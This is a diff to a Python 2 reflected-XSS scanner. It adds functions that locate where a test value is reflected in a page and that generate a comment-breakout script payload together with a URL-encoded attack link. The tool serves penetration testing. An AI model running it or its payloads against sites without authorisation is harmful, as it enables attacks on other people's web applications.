@@ -10,6 +10,7 @@
 """ 
 from urlparse import urlparse, parse_qs
 from HTMLParser import HTMLParser
+import urllib
 import urllib2
 import sys
 import re
@@ -18,20 +19,12 @@ import re
 #GLOBAL VARIABLES
 #######################################################################################################################
 XSSCHECKVAL = "XSSHEREXSS"      #Must be plaintext word unlikely to appear on the page
-CHARS_TO_CHECK = ['"', '\'', '>', '<', ':', ';', '/', '\\', ']', '}']
-ALLOWED_CHARS = []
 URL = ""
 NUM_REFLECTIONS = 0             #Number of times the parameter value is displayed in the code.
 
-IN_DOUBLE_QUOTES = False
-IN_SINGLE_QUOTES = False
-IN_TAG_ATTRIBUTE = False        #Ex: <tag attr="XSSHERE"></tag>
-IN_TAG_NON_ATTRIBUTE = False    #Ex: <tag>XSSHERE</tag>
-IN_SCRIPT_TAG = False
-
 CURRENTLY_OPEN_TAGS = []        #Currently open is modified as the html is parsed
 OPEN_TAGS = []                  #Open is saved once xsscheckval is found
-TAGS_TO_IGNORE = ['html','body','br','div']             #These tags are normally empty <br/> or should be ignored because don't need to close them but sometimes, not coded properly <br> and missed by the parser.
+TAGS_TO_IGNORE = ['html','body','br','div']       #These tags are normally empty <br/> or should be ignored because don't need to close them but sometimes, not coded properly <br> and missed by the parser.
 TAG_WHITELIST = ['input', 'textarea']             #Tags to break out of specifically
 
 OCCURENCE_NUM = 0
@@ -80,6 +73,43 @@ def main():
 #######################################################################################################################
 # OTHER FUNCTIONS
 #######################################################################################################################
+#scan_occurence() runs scan for a reflected instance (a param can be used multiple times on a page)
+def scan_occurence(init_resp):
+    #Begin parsing HTML tags to see where located
+    print "\n[Checking for location of xsscheckval.]"
+    location = html_parse(init_resp)
+    if(location == "comment"):
+        print "Found in an HTML comment."
+        break_comment()
+
+#html_parse() locates the xsscheckval and determins where it is in the HTML
+def html_parse(init_resp):
+    parser = MyHTMLParser()
+    location = ""
+    try:
+        parser.feed(init_resp)
+    except Exception as e:
+        location = str(e)
+    except:
+        print bcolors.FAIL + "ERROR." + bcolors.ENDC + " That was bad. Some sort of parsing error happened. Try rerunning?"
+    return location
+
+#test_param_check() simply checks to see if the provided string exists in the response occurence
+def test_param_check(param_to_check):
+    check_string = "XSSSTART" + param_to_check + "XSSEND"
+    check_url = URL.replace(XSSCHECKVAL, check_string)
+    check_response = make_request(check_url)
+    success = False
+    
+    #Loop to get to right occurence
+    occurence_counter = 0
+    for m in re.finditer('XSSSTART', check_response):
+        occurence_counter += 1
+        if((occurence_counter == OCCURENCE_NUM) and (check_response[m.start():m.start()+len(check_string)] == check_string)):
+            success = True
+            break
+    return success
+
 #make_request() makes a URL request given a provided URL and returns the response
 def make_request(in_url):
     try:
@@ -89,57 +119,18 @@ def make_request(in_url):
     except:
         exit("\n" + bcolors.FAIL + "ERROR" + bcolors.ENDC + " Could not open URL. Exiting...\n")
 
-#scan_occurence() runs scan for a reflected instance (a param can be used multiple times on a page)
-def scan_occurence(init_resp):
-    #Check for allowed characters
-    character_check()
-
-    #Begin parsing HTML tags to see where located
-    html_parse(init_resp)
-
-#character_check() loops through and tests each character to see if it is being escaped
-#if a character is not escaped, it is added to the ALLOWED_CHARS array which is printed at the end
-def character_check():
-    print "\n[Which chacters are allowed?]"
-    global ALLOWED_CHARS
-    for char_to_check in CHARS_TO_CHECK:
-        check_string = "XSSSTART" + char_to_check + "XSSEND"
-        check_url = URL.replace(XSSCHECKVAL, check_string)
-        check_response = make_request(check_url)
-        
-        #Loop to get to right occurence
-        occurence_counter = 0
-        for m in re.finditer('XSSSTART', check_response):
-            #print( 'found', m.start(), m.end() )
-            occurence_counter += 1
-            if((occurence_counter == OCCURENCE_NUM) and (check_response[m.start():m.start()+15] == check_string)):
-                ALLOWED_CHARS.append(char_to_check)
-                break
-
-    ALLOWED_CHARS_str = ""
-    for char in ALLOWED_CHARS:
-        ALLOWED_CHARS_str += char + " "
-    print "Allowed characters: " + ALLOWED_CHARS_str
-
-#html_parse() locates the xsscheckval and determins where it is in the HTML
-def html_parse(init_resp):
-    print "\n[Checking for location of xsscheckval.]"
-    parser = MyHTMLParser()
-    try:
-        parser.feed(init_resp)
-    except Exception as e:
-        if(e == "comment"):
-            print "Inside a comment."
-        elif(e == "script"):
-            print "Inside a script tag."
-        elif(e == "attribute"):
-            print "Inside a tag attribute." #+ last opened tag
-        print str(e) + " tags: " +  str(CURRENTLY_OPEN_TAGS)
-    except:
-        print bcolors.FAIL + "ERROR." + bcolors.ENDC + " That was bad. Some sort of parsing error happened. Try rerunning?"
-        
 #BREAK OUT FUNCTIONS - used to break out of code and determine xss
-def break_script():
+def break_comment():
+    print "\n[Can comment be escaped to execute XSS?]"
+    if(test_param_check(">")):
+        if(test_param_check("<script>")):
+            payload = "--><script>alert(1);</script>"
+            if(test_param_check(payload)):
+                print bcolors.OKGREEN + "SUCCESS." + bcolors.ENDC + " Parameter was reflected in a comment. Use the following payload to break out:"
+                print payload
+                print "Full URL Encoded: " + URL.replace(XSSCHECKVAL, urllib.quote_plus(payload))
+
+def find_script_alt():
     print ""
 
 #######################################################################################################################
